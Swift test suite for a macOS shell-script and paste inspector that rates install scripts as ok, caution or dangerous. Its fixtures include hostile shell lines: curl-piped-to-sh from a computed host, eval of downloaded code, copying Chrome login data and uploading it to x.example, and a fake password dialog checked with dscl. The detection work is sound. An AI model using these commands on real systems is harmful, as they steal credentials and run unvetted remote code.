import Foundation
import Testing

@testable import MacxCore

@Suite("Unresolved code counts as unknown")
struct UnknownsTests {
    let url = URL(string: "https://raw.githubusercontent.com/x/y/i.sh")!
    func inspect(_ s: String) -> Inspection {
        ScriptInspector.inspect(Data(s.utf8), url: url, finalURL: url, knownHosts: ["raw.githubusercontent.com"])
    }

    @Test func evalOfAVariableIsUnknown() {
        let i = inspect("#!/bin/sh\ncode=$(cat /tmp/x)\neval \"$code\"\n")
        #expect(i.unknowns.contains { $0.rule == "runs-unresolved-code" })
        #expect(i.verdict == .caution)  // not "ok": we can't see what it runs
    }

    @Test func downloadFromAComputedURLIsUnknown() {
        let i = inspect("#!/bin/sh\nhost=$(hostname)\ncurl -fsSL \"https://$host.example/x\" | sh\n")
        #expect(i.unknowns.contains { $0.rule == "computed-download" })
        #expect(i.verdict == .caution)
    }

    @Test func downloadingAProgramToRunLaterIsUnknown() {
        let i = inspect("#!/bin/sh\ncurl -fsSL -o /tmp/tool https://raw.githubusercontent.com/x/y/tool\nchmod +x /tmp/tool\n/tmp/tool\n")
        #expect(i.unknowns.contains { $0.rule == "downloads-program-to-run" })
    }

    @Test func generatingAScriptAndRunningItIsUnknown() {
        let i = inspect("#!/bin/sh\necho \"$PAYLOAD\" > /tmp/s.sh\nsh /tmp/s.sh\n")
        #expect(i.unknowns.contains { $0.rule == "runs-generated-script" })
    }

    @Test func plainScriptsHaveNoUnknowns() {
        let i = inspect("#!/bin/sh\nset -e\nmkdir -p \"$HOME/.local/bin\"\ncp tool \"$HOME/.local/bin/\"\necho \"done: $HOME\"\n")
        #expect(i.unknowns.isEmpty)
        #expect(i.verdict == .ok)
    }

    @Test func evalOfAVariableSetFromADownloadIsResolvedToThatDownload() {
        let r = PasteGuard.check("x=$(curl -s https://a.example/k); eval \"$x\"")
        #expect(r.downloads.first?.url == "https://a.example/k")
        #expect(r.needsInspection)
    }

    @Test func evalOfAnUnknownVariableInAPasteIsUnknown() {
        let r = PasteGuard.check("eval \"$PAYLOAD\"")
        #expect(r.unknowns.contains("runs-unresolved-code"))
        #expect(r.isDangerous)
        #expect(!PasteGuard.check("eval \"$(/opt/homebrew/bin/brew shellenv)\"").isDangerous)
    }
}

@Suite("Combination scoring")
struct CombinationScoringTests {
    let url = URL(string: "https://raw.githubusercontent.com/x/y/i.sh")!
    func inspect(_ s: String) -> Inspection {
        ScriptInspector.inspect(Data(s.utf8), url: url, finalURL: url, knownHosts: ["raw.githubusercontent.com"])
    }

    @Test func oneSensitiveActionAloneIsHighNotCritical() {
        // A backup or migration tool might copy browser data; on its own that's worth a look, not a stealer verdict.
        let i = inspect(
            "#!/bin/sh\ncp ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks ~/backup/\ncp ~/Library/Application\\ Support/Google/Chrome/Default/Cookies ~/backup/\n"
        )
        #expect(i.behaviours.first { $0.rule == "browser-data" }?.severity == .high)
        #expect(!i.behaviours.contains { $0.rule == "stealer-pattern" })
    }

    @Test func credentialsPlusUploadIsAStealerPattern() {
        let i = inspect(
            "#!/bin/sh\ncp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp/l\ncurl -F \"f=@/tmp/l\" https://x.example/u\n"
        )
        let s = i.behaviours.first { $0.rule == "stealer-pattern" }
        #expect(s?.severity == .critical)
        #expect(i.verdict == .dangerous)
    }

    @Test func passwordPromptPlusCheckIsAStealerPattern() {
        let i = inspect(
            "#!/bin/zsh\np=$(osascript -e 'display dialog \"x\" default answer \"\" with hidden answer')\ndscl . -authonly \"$USER\" \"$p\"\n"
        )
        #expect(i.behaviours.contains { $0.rule == "stealer-pattern" && $0.severity == .critical })
    }

    @Test func aPasswordBoxIsStillCriticalOnItsOwn() {
        // Asking for the login password in a script-made box has no ordinary use.
        let i = inspect("#!/bin/zsh\nosascript -e 'display dialog \"x\" default answer \"\" with hidden answer'\n")
        #expect(i.behaviours.first { $0.rule == "password-prompt" }?.severity == .critical)
    }
}
